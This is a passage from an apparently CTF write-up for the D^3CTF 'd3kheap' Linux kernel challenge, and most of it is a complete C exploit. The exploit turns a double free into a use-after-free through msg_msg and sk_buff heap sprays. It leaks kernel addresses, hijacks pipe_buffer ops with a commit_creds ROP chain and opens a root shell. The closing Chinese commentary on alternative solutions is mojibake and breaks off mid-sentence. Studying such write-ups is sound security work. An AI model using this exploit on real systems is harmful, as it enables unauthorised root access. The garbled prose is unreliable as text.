class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>    <br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// get a free object</span><br>    add();<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1024</span>)<br>            del();<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger UAF...&quot;</span>);<br>    del();<br><br>    <span class="hljs-comment">// spray sk_buff to mark the UAF msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br><br>    <span class="hljs-comment">// find out the UAF queue</span><br>    victim_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * the msg_msg got changed, so we can&#x27;t read out</span><br><span class="hljs-comment">         * but it tells us which one the victim is</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] victim qid: %d\n&quot;</span>, i);<br>            victim_qid = i;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make the UAF in msg queue!&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;page = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    pipe_buf_ptr-&gt;ops = victim_addr + <span class="hljs-number">0x100</span>;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) &amp;fake_secondary_msg[<span class="hljs-number">0x100</span>];<br>    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// for gdb attach only</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);<br>    sleep(<span class="hljs-number">5</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼ŒæˆåŠŸç‡æ¯”ç¬”è€…æœ€åˆæ‹è„‘é—¨æƒ³çš„è§£æ³•è¦é«˜å¾—å¤šXD</p><p><img src="https://s2.loli.net/2022/05/17/vZhdoFP5TgRc9Ul.png" alt="image.png"></p><h1>0x03.å…¶ä»–çš„é¢„æœŸè§£</h1><p>é™¤äº†ç¬”è€…çš„å®˜æ–¹è§£æ³•ä»¥å¤–ï¼Œç¬”è€…è®¤ä¸ºä»¥ä¸‹æ–¹æ³•åº”å½“ä¹Ÿèƒ½è§£å¼€æœ¬é¢˜ï¼ˆç¬”è€…æœªè¿›è¡Œå°è¯•ï¼‰ï¼š</p><ul><li>ç”±äºæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿæ˜¯ç›´æ¥åœ¨å†…å­˜ä¸­çš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æœç´¢å†…å­˜å¯»æ‰¾ flagï¼ˆç¬”è€…æœ¬äººå¹¶ä¸æ¨èè¿™ç§ä¸“æ³¨äº flag æœ¬èº«çš„è§£æ³•ï¼‰</li><li>ç›´æ¥åˆ†é…å…¶ä»–å¯ä»¥åŠ«æŒ RIP çš„ç»“æ„ä½“ï¼Œç„¶åçˆ†ç ´å†…æ ¸ .text æ®µåç§»ï¼Œåœ¨ pt_regs ä¸Šæ„é€  ROP</li><li>slub å¤§å¸ˆé€šè¿‡å·§å¦™æ„é€ æ³„éœ²å‡º cookie ä¸å †ä¸Šåœ°å€ï¼Œç„¶ååŠ«æŒ freelistï¼ˆç¬”è€…æœ‰æ€è·¯ä½†ç¬”è€…è®¤ä¸ºè¿™ç§è§£æ³•è¿‡äºéº»çƒ¦ + æ²¡æœ‰å¿…è¦ï¼‰<ul><li>æ³„éœ²å‡ºå†…æ ¸åŸºå€ååå†™ä¸€äº›å…¨å±€æŒ‡é’ˆï¼ˆä¾‹å¦‚ <code>n_tty_ops</code>ï¼‰</li><li>åˆ©ç”¨ prctl ä¿®æ”¹ current_task çš„ comm æˆå‘˜ï¼Œæš´åŠ›æœç´¢å†…å­˜æ‰¾åˆ° cred</li></ul></li><li>å°† double free åº”ç”¨åˆ°å…¶ä»–çš„ç»“æ„ä½“ä¸Šï¼Œä½¿å…¶è½¬æ¢ä¸ºä¸€ä¸ªå·²çŸ¥çš„ CVE åç›´æ¥æ‰“</li><li>åˆ©ç”¨ 0day æˆ–æ˜¯ï¼ˆç¬”è€…ä¸çŸ¥é“çš„ï¼‰ 1day ç›´æ¥æ‰“ kernel</li></ul><h1>0x04.è§£é¢˜æƒ…å†µä¸éé¢„æœŸ</h1><p>è¿™ä¸€æ¬¡çš„ D^3CTF ä¸­ç¬”è€…çš„é¢˜æ˜¯ç¬¬äºŒæ‰¹æ”¾å‡ºçš„ï¼Œä½†åœ¨ç¬”è€…æ”¾å‡ºé¢˜ç›®åä¸ä¹…ä¾¿è¢« W&amp;M æˆ˜é˜Ÿæ‹¿ä¸‹äº†ä¸€è¡€ï¼Œè€Œæ•´ä¸ªæ¯”èµ›ä¸­è§£å‡ºäº†è¿™é“é¢˜ç›®çš„é˜Ÿä¼ä¹Ÿè¾¾åˆ°äº† 8 